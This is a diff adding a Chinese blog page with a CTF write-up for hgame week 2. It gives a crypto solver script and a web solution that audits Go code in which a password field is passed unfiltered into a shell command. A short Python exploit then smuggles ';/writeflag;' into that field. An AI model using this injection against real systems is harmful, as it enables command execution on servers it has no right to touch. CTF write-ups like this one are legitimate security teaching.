@@ -1,0 +1,246 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>hgame week2 wp | Z41sArrebol的博客</title><meta name="author" content="Z41sArrebol"><meta name="copyright" content="Z41sArrebol"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="week2明显力不从心了，签到少了，只做出来两题 web要学的东西还很多啊，Java反序列化都没做出来 一道crypto一道web，crypto是ai写的 Crypto 参见sean师傅的博客，我这里只给exp Sean师傅的博客 ##Crypto Ancient Recall 123456789101112131415161718192021222324252627282930313233343">
+<meta property="og:type" content="article">
+<meta property="og:title" content="hgame week2 wp">
+<meta property="og:url" content="http://example.com/2025/02/20/hgame-week2/index.html">
+<meta property="og:site_name" content="Z41sArrebol的博客">
+<meta property="og:description" content="week2明显力不从心了，签到少了，只做出来两题 web要学的东西还很多啊，Java反序列化都没做出来 一道crypto一道web，crypto是ai写的 Crypto 参见sean师傅的博客，我这里只给exp Sean师傅的博客 ##Crypto Ancient Recall 123456789101112131415161718192021222324252627282930313233343">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/girls/%E5%96%B5%E5%96%B5%E5%96%B5.jpeg">
+<meta property="article:published_time" content="2025-02-20T07:59:23.000Z">
+<meta property="article:modified_time" content="2025-02-20T08:06:33.186Z">
+<meta property="article:author" content="Z41sArrebol">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="wp">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/girls/%E5%96%B5%E5%96%B5%E5%96%B5.jpeg"><link rel="shortcut icon" href="/img/%E7%BB%BF%E8%89%B2%E5%A4%B4%E5%83%8F.jpg"><link rel="canonical" href="http://example.com/2025/02/20/hgame-week2/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":300,"highlightFullpage":true,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'hgame week2 wp',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  isShuoshuo: false
+}</script><link rel="stylesheet" href="/css/universe.css"><link rel="stylesheet" href="/css/transpancy.css"><link rel="stylesheet" href="/css/custom.css"><span id="fps"></span><link rel="stylesheet" href="/css/font.css"><meta name="generator" content="Hexo 7.3.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>(()=>{
+  const $loadingBox = document.getElementById('loading-box')
+  const $body = document.body
+  const preloader = {
+    endLoading: () => {
+      $body.style.overflow = ''
+      $loadingBox.classList.add('loaded')
+    },
+    initLoading: () => {
+      $body.style.overflow = 'hidden'
+      $loadingBox.classList.remove('loaded')
+    }
+  }
+
+  preloader.initLoading()
+  window.addEventListener('load', preloader.endLoading)
+
+  if (false) {
+    btf.addGlobalFn('pjaxSend', preloader.initLoading, 'preloader_init')
+    btf.addGlobalFn('pjaxComplete', preloader.endLoading, 'preloader_end')
+  }
+})()</script><div id="web_bg" style="background-image: url(/img/桥.jpg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/%E7%BB%BF%E8%89%B2%E5%A4%B4%E5%83%8F.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">9</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">9</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 目录</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友人帐</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/girls/喵喵喵.jpeg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Z41sArrebol的博客</span></a><a class="nav-page-title" href="/"><span class="site-name">hgame week2 wp</span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 目录</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友人帐</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">hgame week2 wp</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-02-20T07:59:23.000Z" title="发表于 2025-02-20 15:59:23">2025-02-20</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-02-20T08:06:33.186Z" title="更新于 2025-02-20 16:06:33">2025-02-20</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E4%B8%80%E4%B8%AAweb%E8%92%9F%E8%92%BB%E7%9A%84%E6%88%90%E9%95%BF%E6%97%A5%E8%AE%B0/">一个web蒟蒻的成长日记</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">1.1k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>6分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><p>week2明显力不从心了，签到少了，只做出来两题</p>
+<p>web要学的东西还很多啊，Java反序列化都没做出来</p>
+<p>一道crypto一道web，crypto是ai写的</p>
+<p>Crypto 参见sean师傅的博客，我这里只给exp</p>
+<p><a target="_blank" rel="noopener" href="https://seandictionary.top/">Sean师傅的博客</a></p>
+<p>##Crypto Ancient Recall</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Major_Arcana = [<span class="string">&quot;The Fool&quot;</span>, <span class="string">&quot;The Magician&quot;</span>, <span class="string">&quot;The High Priestess&quot;</span>, <span class="string">&quot;The Empress&quot;</span>, <span class="string">&quot;The Emperor&quot;</span>, <span class="string">&quot;The Hierophant&quot;</span>, <span class="string">&quot;The Lovers&quot;</span>, <span class="string">&quot;The Chariot&quot;</span>, <span class="string">&quot;Strength&quot;</span>, <span class="string">&quot;The Hermit&quot;</span>, <span class="string">&quot;Wheel of Fortune&quot;</span>, <span class="string">&quot;Justice&quot;</span>, <span class="string">&quot;The Hanged Man&quot;</span>, <span class="string">&quot;Death&quot;</span>, <span class="string">&quot;Temperance&quot;</span>, <span class="string">&quot;The Devil&quot;</span>, <span class="string">&quot;The Tower&quot;</span>, <span class="string">&quot;The Star&quot;</span>, <span class="string">&quot;The Moon&quot;</span>, <span class="string">&quot;The Sun&quot;</span>, <span class="string">&quot;Judgement&quot;</span>, <span class="string">&quot;The World&quot;</span>]</span><br><span class="line">wands = [<span class="string">&quot;Ace of Wands&quot;</span>, <span class="string">&quot;Two of Wands&quot;</span>, <span class="string">&quot;Three of Wands&quot;</span>, <span class="string">&quot;Four of Wands&quot;</span>, <span class="string">&quot;Five of Wands&quot;</span>, <span class="string">&quot;Six of Wands&quot;</span>, <span class="string">&quot;Seven of Wands&quot;</span>, <span class="string">&quot;Eight of Wands&quot;</span>, <span class="string">&quot;Nine of Wands&quot;</span>, <span class="string">&quot;Ten of Wands&quot;</span>, <span class="string">&quot;Page of Wands&quot;</span>, <span class="string">&quot;Knight of Wands&quot;</span>, <span class="string">&quot;Queen of Wands&quot;</span>, <span class="string">&quot;King of Wands&quot;</span>]</span><br><span class="line">cups = [<span class="string">&quot;Ace of Cups&quot;</span>, <span class="string">&quot;Two of Cups&quot;</span>, <span class="string">&quot;Three of Cups&quot;</span>, <span class="string">&quot;Four of Cups&quot;</span>, <span class="string">&quot;Five of Cups&quot;</span>, <span class="string">&quot;Six of Cups&quot;</span>, <span class="string">&quot;Seven of Cups&quot;</span>, <span class="string">&quot;Eight of Cups&quot;</span>, <span class="string">&quot;Nine of Cups&quot;</span>, <span class="string">&quot;Ten of Cups&quot;</span>, <span class="string">&quot;Page of Cups&quot;</span>, <span class="string">&quot;Knight of Cups&quot;</span>, <span class="string">&quot;Queen of Cups&quot;</span>, <span class="string">&quot;King of Cups&quot;</span>]</span><br><span class="line">swords = [<span class="string">&quot;Ace of Swords&quot;</span>, <span class="string">&quot;Two of Swords&quot;</span>, <span class="string">&quot;Three of Swords&quot;</span>, <span class="string">&quot;Four of Swords&quot;</span>, <span class="string">&quot;Five of Swords&quot;</span>, <span class="string">&quot;Six of Swords&quot;</span>, <span class="string">&quot;Seven of Swords&quot;</span>, <span class="string">&quot;Eight of Swords&quot;</span>, <span class="string">&quot;Nine of Swords&quot;</span>, <span class="string">&quot;Ten of Swords&quot;</span>, <span class="string">&quot;Page of Swords&quot;</span>, <span class="string">&quot;Knight of Swords&quot;</span>, <span class="string">&quot;Queen of Swords&quot;</span>, <span class="string">&quot;King of Swords&quot;</span>]</span><br><span class="line">pentacles = [<span class="string">&quot;Ace of Pentacles&quot;</span>, <span class="string">&quot;Two of Pentacles&quot;</span>, <span class="string">&quot;Three of Pentacles&quot;</span>, <span class="string">&quot;Four of Pentacles&quot;</span>, <span class="string">&quot;Five of Pentacles&quot;</span>, <span class="string">&quot;Six of Pentacles&quot;</span>, <span class="string">&quot;Seven of Pentacles&quot;</span>, <span class="string">&quot;Eight of Pentacles&quot;</span>, <span class="string">&quot;Nine of Pentacles&quot;</span>, <span class="string">&quot;Ten of Pentacles&quot;</span>, <span class="string">&quot;Page of Pentacles&quot;</span>, <span class="string">&quot;Knight of Pentacles&quot;</span>, <span class="string">&quot;Queen of Pentacles&quot;</span>, <span class="string">&quot;King of Pentacles&quot;</span>]</span><br><span class="line">Minor_Arcana = wands + cups + swords + pentacles</span><br><span class="line">tarot = Major_Arcana + Minor_Arcana</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inverse_fortune_wheel</span>(<span class="params">current</span>):</span><br><span class="line">    a, b, c, d, e = current</span><br><span class="line">    numerator = a + b + d - c - e</span><br><span class="line">    <span class="keyword">if</span> numerator % <span class="number">2</span> != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;Cannot invert, odd numerator.&quot;</span>)</span><br><span class="line">    v1 = numerator // <span class="number">2</span></span><br><span class="line">    v0 = a - v1</span><br><span class="line">    v2 = b - v1</span><br><span class="line">    v3 = c - v2</span><br><span class="line">    v4 = d - v3</span><br><span class="line">    <span class="keyword">assert</span> (v4 + v0) == e, <span class="string">&quot;Validation failed.&quot;</span></span><br><span class="line">    <span class="keyword">return</span> [v0, v1, v2, v3, v4]</span><br><span class="line"></span><br><span class="line">final_values = [</span><br><span class="line">    <span class="number">2532951952066291774890498369114195917240794704918210520571067085311474675019</span>,</span><br><span class="line">    <span class="number">2532951952066291774890327666074100357898023013105443178881294700381509795270</span>,</span><br><span class="line">    <span class="number">2532951952066291774890554459287276604903130315859258544173068376967072335730</span>,</span><br><span class="line">    <span class="number">2532951952066291774890865328241532885391510162611534514014409174284299139015</span>,</span><br><span class="line">    <span class="number">2532951952066291774890830662608134156017946376309989934175833913921142609334</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">current = final_values.copy()</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">250</span>):</span><br><span class="line">    current = inverse_fortune_wheel(current)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_card_name</span>(<span class="params">v</span>):</span><br><span class="line">    idx = v % <span class="number">78</span></span><br><span class="line">    reversed_idx = (idx ^ -<span class="number">1</span>) % <span class="number">78</span></span><br><span class="line">    <span class="keyword">if</span> <span class="number">0</span> &lt;= reversed_idx &lt; <span class="number">22</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;re-<span class="subst">&#123;Major_Arcana[reversed_idx]&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> idx &lt; <span class="number">22</span>:</span><br><span class="line">        <span class="keyword">return</span> Major_Arcana[idx]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        minor_idx = idx - <span class="number">22</span></span><br><span class="line">        suit = minor_idx // <span class="number">14</span></span><br><span class="line">        card = minor_idx % <span class="number">14</span></span><br><span class="line">        suit_name = [<span class="string">&#x27;Wands&#x27;</span>, <span class="string">&#x27;Cups&#x27;</span>, <span class="string">&#x27;Swords&#x27;</span>, <span class="string">&#x27;Pentacles&#x27;</span>][suit]</span><br><span class="line">        <span class="keyword">if</span> card &lt; <span class="number">10</span>:</span><br><span class="line">            number = [<span class="string">&#x27;Ace&#x27;</span>, <span class="string">&#x27;Two&#x27;</span>, <span class="string">&#x27;Three&#x27;</span>, <span class="string">&#x27;Four&#x27;</span>, <span class="string">&#x27;Five&#x27;</span>, <span class="string">&#x27;Six&#x27;</span>, <span class="string">&#x27;Seven&#x27;</span>, <span class="string">&#x27;Eight&#x27;</span>, <span class="string">&#x27;Nine&#x27;</span>, <span class="string">&#x27;Ten&#x27;</span>][card]</span><br><span class="line">            <span class="keyword">return</span> <span class="string">f&quot;<span class="subst">&#123;number&#125;</span> of <span class="subst">&#123;suit_name&#125;</span>&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            court = [<span class="string">&#x27;Page&#x27;</span>, <span class="string">&#x27;Knight&#x27;</span>, <span class="string">&#x27;Queen&#x27;</span>, <span class="string">&#x27;King&#x27;</span>][card - <span class="number">10</span>]</span><br><span class="line">            <span class="keyword">return</span> <span class="string">f&quot;<span class="subst">&#123;court&#125;</span> of <span class="subst">&#123;suit_name&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">initial_fate = [get_card_name(v) <span class="keyword">for</span> v <span class="keyword">in</span> current]</span><br><span class="line">flag = <span class="string">&quot;hgame&#123;&quot;</span> + <span class="string">&quot;&amp;&quot;</span>.join(initial_fate).replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;_&quot;</span>) + <span class="string">&quot;&#125;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
+
+<h2 id="web-honeyhot"><a href="#web-honeyhot" class="headerlink" title="web honeyhot"></a>web honeyhot</h2><p>审计源码</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">ImportData</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">	<span class="keyword">var</span> config ImportConfig</span><br><span class="line">	<span class="keyword">if</span> err := c.ShouldBindJSON(&amp;config); err != <span class="literal">nil</span> &#123;</span><br><span class="line">		c.JSON(http.StatusBadRequest, gin.H&#123;</span><br><span class="line">			<span class="string">&quot;success&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">			<span class="string">&quot;message&quot;</span>: <span class="string">&quot;Invalid request body: &quot;</span> + err.Error(),</span><br><span class="line">		&#125;)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> err := validateImportConfig(config); err != <span class="literal">nil</span> &#123;</span><br><span class="line">		c.JSON(http.StatusBadRequest, gin.H&#123;</span><br><span class="line">			<span class="string">&quot;success&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">			<span class="string">&quot;message&quot;</span>: <span class="string">&quot;Invalid input: &quot;</span> + err.Error(),</span><br><span class="line">		&#125;)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	config.RemoteHost = sanitizeInput(config.RemoteHost)</span><br><span class="line">	config.RemoteUsername = sanitizeInput(config.RemoteUsername)</span><br><span class="line">	config.RemoteDatabase = sanitizeInput(config.RemoteDatabase)</span><br><span class="line">	config.LocalDatabase = sanitizeInput(config.LocalDatabase)</span><br><span class="line">	<span class="keyword">if</span> manager.db == <span class="literal">nil</span> &#123;</span><br><span class="line">		dsn := buildDSN(localConfig)</span><br><span class="line">		db, err := sql.Open(<span class="string">&quot;mysql&quot;</span>, dsn)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			c.JSON(http.StatusInternalServerError, gin.H&#123;</span><br><span class="line">				<span class="string">&quot;success&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">				<span class="string">&quot;message&quot;</span>: <span class="string">&quot;Failed to connect to local database: &quot;</span> + err.Error(),</span><br><span class="line">			&#125;)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> err := db.Ping(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">			db.Close()</span><br><span class="line">			c.JSON(http.StatusInternalServerError, gin.H&#123;</span><br><span class="line">				<span class="string">&quot;success&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">				<span class="string">&quot;message&quot;</span>: <span class="string">&quot;Failed to ping local database: &quot;</span> + err.Error(),</span><br><span class="line">			&#125;)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		manager.db = db</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> err := createdb(config.LocalDatabase); err != <span class="literal">nil</span> &#123;</span><br><span class="line">		c.JSON(http.StatusInternalServerError, gin.H&#123;</span><br><span class="line">			<span class="string">&quot;success&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">			<span class="string">&quot;message&quot;</span>: <span class="string">&quot;Failed to create local database: &quot;</span> + err.Error(),</span><br><span class="line">		&#125;)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//Never able to inject shell commands,Hackers can&#x27;t use this,HaHa</span></span><br><span class="line">	command := fmt.Sprintf(<span class="string">&quot;/usr/local/bin/mysqldump -h %s -u %s -p%s %s |/usr/local/bin/mysql -h 127.0.0.1 -u %s -p%s %s&quot;</span>,</span><br><span class="line">		config.RemoteHost,</span><br><span class="line">		config.RemoteUsername,</span><br><span class="line">		config.RemotePassword,</span><br><span class="line">		config.RemoteDatabase,</span><br><span class="line">		localConfig.Username,</span><br><span class="line">		localConfig.Password,</span><br><span class="line">		config.LocalDatabase,</span><br><span class="line">	)</span><br></pre></td></tr></table></figure>
+
+<p>dirsearch扫一下发现flag目录但是403，审计源码注意到config.RemotePassword无过滤</p>
+<p>且题目提示执行writeflag命令，于是构造即可</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">target=<span class="string">&quot;http://node1.hgame.vidar.club:32511&quot;</span></span><br><span class="line">res = requests.post(target+<span class="string">&#x27;/api/import&#x27;</span>,json=&#123;</span><br><span class="line">    <span class="string">&quot;remote_host&quot;</span>: <span class="string">&quot;127.0.0.1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;remote_port&quot;</span>: <span class="string">&quot;3389&quot;</span>,</span><br><span class="line">    <span class="string">&quot;remote_username&quot;</span>: <span class="string">&quot;test_usernane&quot;</span>,</span><br><span class="line">    <span class="string">&quot;remote_password&quot;</span>: <span class="string">&quot;;/writeflag;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;remote_database&quot;</span>: <span class="string">&quot;test_databaseName&quot;</span>,</span><br><span class="line">    <span class="string">&quot;local_database&quot;</span>: <span class="string">&quot;test_localdatabaseName&quot;</span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br><span class="line">res = requests.get(target+<span class="string">&#x27;/flag&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>‍</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">Z41sArrebol</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2025/02/20/hgame-week2/">http://example.com/2025/02/20/hgame-week2/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://example.com" target="_blank">Z41sArrebol的博客</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a><a class="post-meta__tags" href="/tags/wp/">wp</a></div><div class="post-share"><div class="social-share" data-image="/img/girls/%E5%96%B5%E5%96%B5%E5%96%B5.jpeg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2025/02/18/CSS%E9%9A%8F%E8%AE%B0/" title="CSS随记"><img class="cover" src="/img/girls/%E6%98%9F%E6%B2%B3%E5%B0%91%E5%A5%B3.jpeg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">CSS随记</div></div><div class="info-2"><div 